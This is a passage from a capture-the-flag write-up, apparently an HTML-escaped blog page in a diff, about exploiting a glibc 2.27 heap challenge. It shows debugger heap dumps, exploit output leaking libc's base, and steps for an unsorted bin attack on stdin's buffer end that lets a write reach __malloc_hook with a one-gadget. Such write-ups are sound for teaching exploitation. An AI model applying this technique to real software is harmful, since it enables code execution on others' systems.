+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085d0:	0x0000000000000000	0x0000000000000000
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085e0:	0x0000000000000000	0x00000000000000b1
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085f0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608600:	0x4343434343434343	0x4343434343434343
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608610:	0x0a43434343434343	0x0000000000000041
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608620:	0x4444444444444444	0x4444444444444444
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608630:	0x000000000000000a	0x0000000000000000
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608640:	0x0000000000000000	0x0000000000000000
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608650:	0x0000000000000000	0x0000000000000031
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608660:	0x4545454545454545	0x4545454545454545
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608670:	0x4545454545454545	0x4545454545454545
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608680:	0x0a45454545454545	0x0000000000000031
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608690:	0x00000000000000b0	0x0000000000000020
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556086a0:	0x000000000000000a	0x0000000000000000
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556086b0:	0x0000000000000000	0x0000000000020951
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;unsortedbin
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;all: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;tcachebins
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0xb0 [  7]: 0x5555556085f0 —▸ 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555556086b0 ◂— 0x0
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Which gives:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;nasm@off:~/Documents/pwn/HTB/apocalypse/onceAndmore$ python3 exploit.py LOCAL GDB NOASLR
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all&amp;#39;&lt;/span&gt;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/out&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Debugging process with ASLR disabled
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Starting local process &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/usr/bin/gdbserver&amp;#39;&lt;/span&gt;: pid &lt;span style=&#34;color:#ae81ff&#34;&gt;31378&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; running in new terminal: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/usr/bin/gdb&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-q&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-x&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/tmp/pwn1z_5e0ie.gdb&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; libc: 0x7ffff79e4000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We now have achieved the first step of the challenge: leak the libc base address.&lt;/p&gt;
+&lt;h2 id=&#34;what-can-we-target-in-the-libc-&#34;&gt;What can we target in the libc ?&lt;/h2&gt;
+&lt;p&gt;There are a lot of ways to achieve code execution according to what I red in other write-ups, I choose to attack &lt;code&gt;_IO_stdin&lt;/code&gt; by running an unsorted bin attack on its &lt;code&gt;_IO_buf_end&lt;/code&gt; field which holds the end of the internal buffer of &lt;code&gt;stdin&lt;/code&gt; from &lt;code&gt;_IO_buf_base&lt;/code&gt;, according to the &lt;a href=&#34;https://elixir.bootlin.com/glibc/glibc-2.27/source/libio/fileops.c#L469&#34;&gt;glibc source code&lt;/a&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;_IO_new_file_underflow&lt;/span&gt; (_IO_FILE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fp)
+{
+  _IO_ssize_t count;
+&lt;span style=&#34;color:#75715e&#34;&gt;#if 0&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;  /* SysV does not make this test; take it out for compatibility */
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;  if (fp-&amp;gt;_flags &amp;amp; _IO_EOF_SEEN)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    return (EOF);
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#endif
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; _IO_NO_READS)
+    {
+      fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; _IO_ERR_SEEN;
+      __set_errno (EBADF);
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; EOF;
+    }
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_ptr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_end)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_ptr;
+
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
+    {
+      &lt;span style=&#34;color:#75715e&#34;&gt;/* Maybe we already have a push back pointer.  */&lt;/span&gt;
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_save_base &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL)
+	{
+	  free (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_save_base);
+	  fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;_IO_IN_BACKUP;
+	}
+      _IO_doallocbuf (fp);
+    }
+
+  &lt;span style=&#34;color:#75715e&#34;&gt;/* Flush all line buffered files before reading. */&lt;/span&gt;
+  &lt;span style=&#34;color:#75715e&#34;&gt;/* FIXME This can/should be moved to genops ?? */&lt;/span&gt;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; (_IO_LINE_BUF&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;_IO_UNBUFFERED))
+    {
+&lt;span style=&#34;color:#75715e&#34;&gt;#if 0&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;      _IO_flush_all_linebuffered ();
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#else
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      &lt;span style=&#34;color:#75715e&#34;&gt;/* We used to flush all line-buffered stream.  This really isn&amp;#39;t
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	 required by any standard.  My recollection is that
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	 traditional Unix systems did this for stdout.  stderr better
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	 not be line buffered.  So we do just that here
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	 explicitly.  --drepper */&lt;/span&gt;
+      _IO_acquire_lock (_IO_stdout);
+
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((_IO_stdout&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; (_IO_LINKED &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; _IO_NO_WRITES &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; _IO_LINE_BUF))
+	  &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (_IO_LINKED &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; _IO_LINE_BUF))
+	_IO_OVERFLOW (_IO_stdout, EOF);
+
+      _IO_release_lock (_IO_stdout);
+&lt;span style=&#34;color:#75715e&#34;&gt;#endif
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }
+
+  _IO_switch_to_get_mode (fp);
+
+  &lt;span style=&#34;color:#75715e&#34;&gt;/* This is very tricky. We have to adjust those
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;     pointers before we call _IO_SYSREAD () since
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;     we may longjump () out while waiting for
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;     input. Those pointers may be screwed up. H.J. */&lt;/span&gt;
+  fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base;
+  fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base;
+  fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_end
+    &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base;
+
+  count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _IO_SYSREAD (fp, fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base,
+		       fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_end &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (count &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
+    {
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (count &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
+	fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; _IO_EOF_SEEN;
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+	fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; _IO_ERR_SEEN, count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+  }
+  fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_end &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; count;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (count &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
+    {
+      &lt;span style=&#34;color:#75715e&#34;&gt;/* If a stream is read to EOF, the calling application may switch active
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	 handles.  As a result, our offset cache would no longer be valid, so
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	 unset it.  */&lt;/span&gt;
+      fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _IO_pos_BAD;
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; EOF;
+    }
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_offset &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; _IO_pos_BAD)
+    _IO_pos_adjust (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_offset, count);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_ptr;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The interesting part is the &lt;code&gt;count = _IO_SYSREAD (fp, fp-&amp;gt;_IO_buf_base, fp-&amp;gt;_IO_buf_end - fp-&amp;gt;_IO_buf_base);&lt;/code&gt; which reads &lt;code&gt;fp-&amp;gt;_IO_buf_end - fp-&amp;gt;_IO_buf_base&lt;/code&gt; bytes in &lt;code&gt;fp-&amp;gt;_IO_buf_base&lt;/code&gt;. Which means if &lt;code&gt;fp-&amp;gt;_IO_buf_end&lt;/code&gt; is replaced with the help of an unsorted bin attack by the address of the unsorted bin and that &lt;code&gt;&amp;amp;unsorted bin &amp;gt; fp-&amp;gt;_IO_buf_base&lt;/code&gt;, we can trigger an out of bound write from a certain address up to the address of the unsorted bin. We can inspect the layout in gdb to see what&amp;rsquo;s actually going on:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;pwndbg&amp;gt; x/100gx stdin
+0x7ffff7dcfa00 &amp;lt;_IO_2_1_stdin_&amp;gt;:	0x00000000fbad208b	0x00007ffff7dcfa83
+0x7ffff7dcfa10 &amp;lt;_IO_2_1_stdin_+16&amp;gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
+0x7ffff7dcfa20 &amp;lt;_IO_2_1_stdin_+32&amp;gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
+0x7ffff7dcfa30 &amp;lt;_IO_2_1_stdin_+48&amp;gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
+0x7ffff7dcfa40 &amp;lt;_IO_2_1_stdin_+64&amp;gt;:	0x00007ffff7dcfa84	0x0000000000000000
+0x7ffff7dcfa50 &amp;lt;_IO_2_1_stdin_+80&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfa60 &amp;lt;_IO_2_1_stdin_+96&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfa70 &amp;lt;_IO_2_1_stdin_+112&amp;gt;:	0x0000001000000000	0xffffffffffffffff
+0x7ffff7dcfa80 &amp;lt;_IO_2_1_stdin_+128&amp;gt;:	0x000000000a000000	0x00007ffff7dd18d0
+0x7ffff7dcfa90 &amp;lt;_IO_2_1_stdin_+144&amp;gt;:	0xffffffffffffffff	0x0000000000000000
+0x7ffff7dcfaa0 &amp;lt;_IO_2_1_stdin_+160&amp;gt;:	0x00007ffff7dcfae0	0x0000000000000000
+0x7ffff7dcfab0 &amp;lt;_IO_2_1_stdin_+176&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfac0 &amp;lt;_IO_2_1_stdin_+192&amp;gt;:	0x00000000ffffffff	0x0000000000000000
+0x7ffff7dcfad0 &amp;lt;_IO_2_1_stdin_+208&amp;gt;:	0x0000000000000000	0x00007ffff7dcc2a0
+0x7ffff7dcfae0 &amp;lt;_IO_wide_data_0&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfaf0 &amp;lt;_IO_wide_data_0+16&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb00 &amp;lt;_IO_wide_data_0+32&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb10 &amp;lt;_IO_wide_data_0+48&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb20 &amp;lt;_IO_wide_data_0+64&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb30 &amp;lt;_IO_wide_data_0+80&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb40 &amp;lt;_IO_wide_data_0+96&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb50 &amp;lt;_IO_wide_data_0+112&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb60 &amp;lt;_IO_wide_data_0+128&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb70 &amp;lt;_IO_wide_data_0+144&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb80 &amp;lt;_IO_wide_data_0+160&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb90 &amp;lt;_IO_wide_data_0+176&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfba0 &amp;lt;_IO_wide_data_0+192&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfbb0 &amp;lt;_IO_wide_data_0+208&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfbc0 &amp;lt;_IO_wide_data_0+224&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfbd0 &amp;lt;_IO_wide_data_0+240&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfbe0 &amp;lt;_IO_wide_data_0+256&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfbf0 &amp;lt;_IO_wide_data_0+272&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfc00 &amp;lt;_IO_wide_data_0+288&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfc10 &amp;lt;_IO_wide_data_0+304&amp;gt;:	0x00007ffff7dcbd60	0x0000000000000000
+0x7ffff7dcfc20 &amp;lt;__memalign_hook&amp;gt;:	0x00007ffff7a7b410	0x00007ffff7a7c790
+0x7ffff7dcfc30 &amp;lt;__malloc_hook&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfc40 &amp;lt;main_arena&amp;gt;:	0x0000000000000000	0x0000000000000001
+0x7ffff7dcfc50 &amp;lt;main_arena+16&amp;gt;:	0x0000000000000000	0x00005555556085e0
+0x7ffff7dcfc60 &amp;lt;main_arena+32&amp;gt;:	0x0000555555608560	0x0000000000000000
+0x7ffff7dcfc70 &amp;lt;main_arena+48&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfc80 &amp;lt;main_arena+64&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfc90 &amp;lt;main_arena+80&amp;gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfca0 &amp;lt;main_arena+96&amp;gt;:	0x00005555556086b0	&amp;lt;- &amp;amp;unsortedbin = 0x7ffff7dcfca0
+pwndbg&amp;gt; p *stdin
+$1 = {
+  _flags = -72540021,
+  _IO_read_ptr = 0x7ffff7dcfa83 &amp;lt;_IO_2_1_stdin_+131&amp;gt; &amp;quot;\n&amp;quot;,
+  _IO_read_end = 0x7ffff7dcfa83 &amp;lt;_IO_2_1_stdin_+131&amp;gt; &amp;quot;\n&amp;quot;,
+  _IO_read_base = 0x7ffff7dcfa83 &amp;lt;_IO_2_1_stdin_+131&amp;gt; &amp;quot;\n&amp;quot;,
+  _IO_write_base = 0x7ffff7dcfa83 &amp;lt;_IO_2_1_stdin_+131&amp;gt; &amp;quot;\n&amp;quot;,
+  _IO_write_ptr = 0x7ffff7dcfa83 &amp;lt;_IO_2_1_stdin_+131&amp;gt; &amp;quot;\n&amp;quot;,
+  _IO_write_end = 0x7ffff7dcfa83 &amp;lt;_IO_2_1_stdin_+131&amp;gt; &amp;quot;\n&amp;quot;,
+  _IO_buf_base = 0x7ffff7dcfa83 &amp;lt;_IO_2_1_stdin_+131&amp;gt; &amp;quot;\n&amp;quot;,
+  _IO_buf_end = 0x7ffff7dcfa84 &amp;lt;_IO_2_1_stdin_+132&amp;gt; &amp;quot;&amp;quot;,
+  _IO_save_base = 0x0,
+  _IO_backup_base = 0x0,
+  _IO_save_end = 0x0,
+  _markers = 0x0,
+  _chain = 0x0,
+  _fileno = 0,
+  _flags2 = 16,
+  _old_offset = -1,
+  _cur_column = 0,
+  _vtable_offset = 0 &#39;\000&#39;,
+  _shortbuf = &amp;quot;\n&amp;quot;,
+  _lock = 0x7ffff7dd18d0 &amp;lt;_IO_stdfile_0_lock&amp;gt;,
+  _offset = -1,
+  _codecvt = 0x0,
+  _wide_data = 0x7ffff7dcfae0 &amp;lt;_IO_wide_data_0&amp;gt;,
+  _freeres_list = 0x0,
+  _freeres_buf = 0x0,
+  __pad5 = 0,
+  _mode = -1,
+  _unused2 = &#39;\000&#39; &amp;lt;repeats 19 times&amp;gt;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As you can see right above and according to the source code showed previously, &lt;code&gt;_IO_stdin-&amp;gt;_IO_buf_base&lt;/code&gt; points toward &lt;code&gt;_IO_stdin-&amp;gt;_shortbuf&lt;/code&gt;, an internal buffer directly in &lt;code&gt;stdin&lt;/code&gt;. And &lt;code&gt;&amp;amp;unsortedbin &amp;gt; _IO_buf_base &amp;gt; stdin&lt;/code&gt;. If you do not understand fully my explanations, I advise you to take a look at &lt;a href=&#34;https://nightrainy.github.io/2019/08/07/play-withe-file-structure-%E6%90%AC%E8%BF%90/&#34;&gt;this great article&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Then we should be able to control every bytes between &lt;code&gt;&amp;amp;stdin-&amp;gt;_shortbuf&lt;/code&gt; and &lt;code&gt;&amp;amp;unsortedbin&lt;/code&gt;. And the incredible thing to note is that in this small range, there is what every heap pwner is always looking for: &lt;code&gt;__malloc_hook&lt;/code&gt; !!&lt;/p&gt;
+&lt;p&gt;Then we just have to overwrite the pointers inside &lt;code&gt;stdin&lt;/code&gt;, &lt;code&gt;_IO_wide_data_0&lt;/code&gt; and &lt;code&gt;__memalign_hook&lt;/code&gt; to finally reach &lt;code&gt;__malloc_hook&lt;/code&gt; and write the address of a one-gadget !&lt;/p&gt;
+&lt;h2 id=&#34;unsorted-bin-attack-on-stdin-_io_buf_end&#34;&gt;Unsorted bin attack on stdin-&amp;gt;_IO_buf_end&lt;/h2&gt;
+&lt;p&gt;Here was theory, let&amp;rsquo;s see how we can do that. To understand unsorted bin attack &lt;a href=&#34;https://squarepants0.github.io/2020/10/20/unsorted-bin-attack/&#34;&gt;here&lt;/a&gt; is a good article about unsorted bin attack. The unsorted bin attack using partial unlink is basically:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;overwrite the backward pointer of the last chunk in the unsorted bin by &lt;code&gt;&amp;amp;target - 0x10&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;request the &lt;strong&gt;exact&lt;/strong&gt; size of the last chunk in the unsorted bin&lt;/li&gt;
+&lt;li&gt;It should write at &lt;code&gt;&amp;amp;target&lt;/code&gt; the address of the unsorted bin&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;An essential thing to note is that if there is no chunks in your fastbin / smallbin and that you&amp;rsquo;re requesting a fastbin/smallbin-sized chunk, the unsorted bin will be inspected and if the last chunk doesn&amp;rsquo;t fit the request, the program will most of the time issues a &lt;code&gt;malloc(): memory corruption&lt;/code&gt;. Anyway the best thing to do is to take a look at the &lt;a href=&#34;https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3519&#34;&gt;code&lt;/a&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
